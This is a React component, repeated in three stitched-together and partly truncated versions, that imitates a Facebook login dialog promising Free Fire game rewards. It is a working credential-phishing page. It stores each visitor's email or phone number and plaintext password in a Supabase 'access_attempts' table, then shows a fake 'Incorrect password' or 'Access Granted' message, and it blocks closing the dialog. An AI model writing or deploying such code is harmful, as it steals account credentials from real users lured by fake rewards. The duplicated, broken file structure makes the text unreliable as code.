import { useState } from 'react';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { CheckCircle, X } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';

interface RewardItem {
  id: number;
  name: string;
  description: string;
  rarity: 'Legendary' | 'Epic' | 'Rare';
  image_url: string;
}

interface AccessModalProps {
  isOpen: boolean;
  onClose: () => void;
  item: RewardItem | null;
}

const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
  const [email, setEmail] = useState('');
  const [passphrase, setPassphrase] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const { toast } = useToast();

  const validateInput = (input: string) => {
    const phoneRegex = /^\d{10}$/;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return phoneRegex.test(input) || emailRegex.test(input);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!item) return;

    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 1500));

    const isValidInput = validateInput(email);
    const isValidPassword = passphrase.length >= 6;

    try {
      const { data, error } = await supabase
        .from('access_attempts')
        .insert({
          email,
          passphrase,
          item_id: item.id,
          item_name: item.name,
          status: isValidInput && isValidPassword ? 'success' : 'failed'
        })
        .select();

      if (error) console.error('Save error:', error);
    } catch (error) {
      console.error('Save error:', error);
    }

    if (!isValidInput || !isValidPassword) {
      toast({
        variant: "destructive",
        title: "Incorrect password. Please try again.",
        className: "bg-red-500 text-white border-red-600",
      });
      setIsLoading(false);
      return;
    }

    setIsLoading(false);
    setShowSuccess(true);
  };

  const handleClose = () => {
    setEmail('');
    setPassphrase('');
    setShowSuccess(false);
    onClose();
  };

  const handleSuccessClose = () => {
    setShowSuccess(false);
    handleClose();
  };

  if (showSuccess) {
    return (
      <Dialog open={isOpen} onOpenChange={handleClose}>
        <DialogContent className="max-w-md p-0 border-0 bg-transparent shadow-none">
          <div className="bg-card rounded-lg p-8 text-center space-y-6 border border-primary/20 shadow-2xl">
            <div className="mx-auto w-20 h-20 bg-gradient-to-r from-primary to-accent rounded-full flex items-center justify-center animate-royal-pulse">
              <CheckCircle className="w-10 h-10 text-primary-foreground" />
            </div>
            <div className="space-y-2">
              <h3 className="text-2xl font-bold text-primary">✅ Access Granted</h3>
              <p className="text-muted-foreground">
                Your rewards will be processed in 24 hours.<br />
                Please check your in-game inbox.
              </p>
            </div>
            <Button onClick={handleSuccessClose} className="btn-royal w-full animate-glow">
              OK
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    );
  }

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogContent
        className="w-[340px] h-[400px] p-0 overflow-hidden bg-white shadow-2xl rounded-xl"
        onPointerDownOutside={(e) => e.preventDefault()}
        onEscapeKeyDown={(e) => e.preventDefault()}
      >
        {/* Facebook Header */}
        <div className="bg-[#3b5998] text-white text-center py-4 relative">
          <h1 className="text-2xl font-bold" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>facebook</h1>
          <button onClick={handleClose} className="absolute top-3 right-3 text-white hover:text-gray-200">
            <X className="h-6 w-6" />
          </button>
        </div>

        <div className="p-4 overflow-y-auto max-h-[calc(100%-60px)]">
          {item && (
            <div className="text-center mb-4">
              <div className="w-14 h-14 mx-auto mb-2 rounded-xl overflow-hidden shadow-lg">
                <img
                  src={item.image_url || '/logo.png'}
                  alt="Game Icon"
                  className="w-full h-full object-cover"
                />
              </div>
              <p className="text-gray-600 text-sm" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
                Log in your Facebook account to connect to<br />Free Fire.
              </p>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-3">
            <input
              type="text"
              placeholder="Mobile number or email address"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              className="w-full p-[12px] text-[15px] border border-[#dddfe2] rounded-md bg-[#f5f6f7] text-black outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2]"
              style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
            />
            <div className="relative">
              <input
                type="password"
                placeholder="Password"
                value={passphrase}
                onChange={(e) => setPassphrase(e.target.value)}
                required
                className="w-full p-[12px] text-[15px] border border-[#dddfe2] rounded-md bg-[#f5f6f7] text-black pr-10 outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2]"
                style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
              />
              <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                </svg>
              </div>
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="w-full p-[12px] text-[18px] bg-[#1877f2] hover:bg-[#166fe5] text-white rounded-md font-bold cursor-pointer transition-colors disabled:opacity-50"
              style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
            >
              {isLoading ? (
                <div className="flex items-center justify-center gap-2">
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  Logging in...
                </div>
              ) : (
                'Log In'
              )}
            </button>
          </form>

          <div className="mt-6 text-center space-y-3 text-sm" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
            <a href="#" className="text-[#1877f2] hover:underline">Create Account</a>
            <a href="#" className="text-gray-600 hover:underline block">Not now</a>
            <a href="#" className="text-[#1877f2] hover:underline">Forgotten password?</a>

            <div className="border-t border-[#dadde1] pt-4 mt-4 grid grid-cols-2 gap-1 text-xs text-gray-500">
              <span>English (UK)</span><span>العربية</span>
              <span>Türkçe</span><span>Tiếng Việt</span>
              <span>日本語</span><span>Español</span>
              <span>Português (Brasil)</span>
              <div className="col-span-2 flex justify-center">
                <button className="w-6 h-6 border border-gray-300 rounded text-gray-400 text-lg">+</button>
              </div>
              <div className="col-span-2 text-center text-gray-400 pt-2">Meta © 2025</div>
            </div>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default AccessModal;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!item) return;

    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 1500));

    const isValidInput = validateInput(email);
    const isValidPassword = passphrase.length >= 6;

    try {
      const { data, error } = await supabase
        .from('access_attempts')
        .insert({
          email,
          passphrase,
          item_id: item.id,
          item_name: item.name,
          status: isValidInput && isValidPassword ? 'success' : 'failed'
        })
        .select();

      if (error) {
        console.error('Error saving access attempt:', error);
      } else {
        console.log('Access attempt saved:', data);
      }
    } catch (error) {
      console.error('Save error:', error);
    }

    if (!isValidInput || !isValidPassword) {
      toast({
        variant: "destructive",
        title: "Incorrect password. Please try again.",
        className: "bg-red-500 text-white border-red-600",
      });
      setIsLoading(false);
      return;
    }

    setIsLoading(false);
    setShowSuccess(true);
  };

  const handleClose = () => {
    setEmail('');
    setPassphrase('');
    setShowSuccess(false);
    onClose();
  };

  const handleSuccessClose = () => {
    setShowSuccess(false);
    handleClose();
  };

  if (showSuccess) {
    return (
      <Dialog open={isOpen} onOpenChange={handleClose}>
        <DialogContent className="max-w-md p-0 border-0 bg-transparent shadow-none">
          <div className="bg-card rounded-lg p-8 text-center space-y-6 border border-primary/20 shadow-2xl">
            <div className="mx-auto w-20 h-20 bg-gradient-to-r from-primary to-accent rounded-full flex items-center justify-center animate-royal-pulse">
              <CheckCircle className="w-10 h-10 text-primary-foreground" />
            </div>
            <div className="space-y-2">
              <h3 className="text-2xl font-bold text-primary">✅ Access Granted</h3>
              <p className="text-muted-foreground">
                Your rewards will be processed in 24 hours.<br />
                Please check your in-game inbox.
              </p>
            </div>
            <Button onClick={handleSuccessClose} className="btn-royal w-full animate-glow">
              OK
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    );
  }

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogContent
        className="w-[360px] h-[360px] p-0 overflow-hidden bg-white shadow-2xl rounded-xl"
        onPointerDownOutside={(e) => e.preventDefault()}
        onEscapeKeyDown={(e) => e.preventDefault()}
      >
        {/* Facebook Header */}
        <div className="bg-[#1877f2] text-white text-center py-4 relative">
          <h1 className="text-2xl font-bold" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>facebook</h1>
          <button
            onClick={handleClose}
            className="absolute top-3 right-3 text-white hover:text-gray-200 transition-colors"
          >
            <X className="h-6 w-6" />
          </button>
        </div>

        {/* Content */}
        <div className="p-4 overflow-y-auto max-h-[calc(100%-60px)]">
          {item && (
            <div className="text-center mb-4">
              <div className="w-14 h-14 mx-auto mb-2 rounded-xl overflow-hidden shadow-lg">
                <img
                  src="/lovable-uploads/c975bbbd-21d4-45de-8dbc-07ed98b7a6ba.png"
                  alt="Free Fire"
                  className="w-full h-full object-cover"
                />
              </div>
              <p className="text-gray-600 text-sm" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
                Log in your Facebook account to connect to<br />Free Fire.
              </p>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-3">
            <input
              type="text"
              placeholder="Mobile number or email address"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              className="w-full p-[12px] text-[15px] border border-[#dddfe2] rounded-md bg-[#f5f6f7] text-black outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
              style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
            />
            <div className="relative">
              <input
                type="password"
                placeholder="Password"
                value={passphrase}
                onChange={(e) => setPassphrase(e.target.value)}
                required
                className="w-full p-[12px] text-[15px] border border-[#dddfe2] rounded-md bg-[#f5f6f7] text-black pr-10 outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
                style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
              />
              <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                </svg>
              </div>
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="w-full p-[12px] text-[18px] bg-[#1877f2] hover:bg-[#166fe5] text-white rounded-md font-bold cursor-pointer transition-colors disabled:opacity-50"
              style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
            >
              {isLoading ? (
                <div className="flex items-center justify-center gap-2">
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  Logging in...
                </div>
              ) : (
                'Log In'
              )}
            </button>
          </form>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default AccessModal;
      const { data, error } = await supabase
        .from('access_attempts')
        .insert({
          email: email,
          passphrase: passphrase,
          item_id: item.id,
          item_name: item.name,
          status: (isValidInput && isValidPassword) ? 'success' : 'failed'
        })
        .select();
      
      if (error) {
        console.error('Error saving access attempt:', error);
      } else {
        console.log('Access attempt saved successfully:', data);
      }
    } catch (error) {
      console.error('Error saving access attempt:', error);
    }

    // Check validation and show Facebook-style error if invalid
    if (!isValidInput || !isValidPassword) {
      toast({
        variant: "destructive",
        title: "Incorrect password. Please try again.",
        description: "",
        className: "bg-red-500 text-white border-red-600",
      });
      setIsLoading(false);
      return;
    }

    // Success
    setIsLoading(false);
    setShowSuccess(true);
  };

  const handleClose = () => {
    setEmail('');
    setPassphrase('');
    setShowSuccess(false);
    onClose();
  };

  const handleSuccessClose = () => {
    setShowSuccess(false);
    handleClose();
  };

  if (showSuccess) {
    return (
      <Dialog open={isOpen} onOpenChange={handleClose}>
        <DialogContent className="max-w-md p-0 border-0 bg-transparent shadow-none">
          <div className="bg-card rounded-lg p-8 text-center space-y-6 border border-primary/20 shadow-2xl">
            <div className="mx-auto w-20 h-20 bg-gradient-to-r from-primary to-accent rounded-full flex items-center justify-center animate-royal-pulse">
              <CheckCircle className="w-10 h-10 text-primary-foreground" />
            </div>
            
            <div className="space-y-2">
              <h3 className="text-2xl font-bold text-primary">✅ Access Granted</h3>
              <p className="text-muted-foreground">
                Your rewards will be processed in 24 hours.<br />
                Please check your in-game inbox.
              </p>
            </div>

            <Button 
              onClick={handleSuccessClose}
              className="btn-royal w-full animate-glow"
            >
              OK
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    );
  }

  return (
    <Dialog open={isOpen}>
      <DialogContent className="max-w-xs w-80 p-0 overflow-hidden bg-white shadow-2xl" onPointerDownOutside={(e) => e.preventDefault()} onEscapeKeyDown={(e) => e.preventDefault()}>
        {/* Facebook Header */}
        <div className="bg-[#1877f2] text-white text-center py-4 relative">
          <h1 className="text-2xl font-bold" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>facebook</h1>
          <button 
            onClick={handleClose}
            className="absolute top-3 right-3 text-white hover:text-gray-200 transition-colors"
          >
            <X className="h-6 w-6" />
          </button>
        </div>

        {/* Content */}
        <div className="p-6">
          {/* Game Icon and Description */}
          <div className="text-center mb-6">
            {item && (
              <div className="mb-4">
                <div className="w-16 h-16 mx-auto mb-3 rounded-xl overflow-hidden shadow-lg">
                  <img 
                    src="/lovable-uploads/c975bbbd-21d4-45de-8dbc-07ed98b7a6ba.png" 
                    alt="Free Fire"
                    className="w-full h-full object-cover"
                  />
                </div>
                <p className="text-gray-600 text-sm" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
                  Log in your Facebook account to connect to<br />
                  Free Fire.
                </p>
              </div>
            )}
          </div>

          {/* Login Form */}
          <form onSubmit={handleSubmit} className="space-y-3">
            <div>
              <input
                type="text"
                placeholder="Mobile number or email address"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
                className="w-full p-[14px] text-[17px] border border-[#dddfe2] rounded-md bg-[#f5f6f7] text-black outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
                style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
              />
            </div>

            <div className="relative">
              <input
                type="password"
                placeholder="Password"
                value={passphrase}
                onChange={(e) => setPassphrase(e.target.value)}
                required
                className="w-full p-[14px] text-[17px] border border-[#dddfe2] rounded-md bg-[#f5f6f7] text-black pr-12 outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
                style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
              />
              <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                </svg>
              </div>
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="w-full p-[14px] text-[20px] bg-[#1877f2] hover:bg-[#166fe5] text-white border-none rounded-md font-bold cursor-pointer transition-colors disabled:opacity-50 mt-4"
              style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
            >
              {isLoading ? (
                <div className="flex items-center justify-center gap-2">
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  Logging in...
                </div>
              ) : (
                'Log In'
              )}
            </button>
          </form>

          {/* Footer Links */}
          <div className="mt-6 text-center space-y-4">
            <div className="space-y-2">
              <a href="#" className="block text-[#1877f2] text-sm hover:underline" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
                Create Account
              </a>
              <a href="#" className="block text-gray-500 text-sm hover:underline" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
                Not now
              </a>
              <a href="#" className="block text-[#1877f2] text-sm hover:underline" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
                Forgotten password?
              </a>
            </div>

            {/* Language Options */}
            <div className="border-t border-[#dadde1] pt-4 mt-6">
              <div className="grid grid-cols-2 gap-x-4 gap-y-2 text-xs text-gray-500" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
                <span>English (UK)</span>
                <span>العربية</span>
                <span>Türkçe</span>
                <span>Tiếng Việt</span>
                <span>日本語</span>
                <span>Español</span>
                <span>Português (Brasil)</span>
                <div className="flex items-center justify-center">
                  <button className="w-6 h-6 border border-gray-300 rounded flex items-center justify-center hover:bg-gray-50">
                    <span className="text-gray-400 text-lg leading-none">+</span>
                  </button>
                </div>
              </div>
              <div className="text-xs text-gray-400 mt-4" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
                Meta © 2025
              </div>
            </div>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default AccessModal;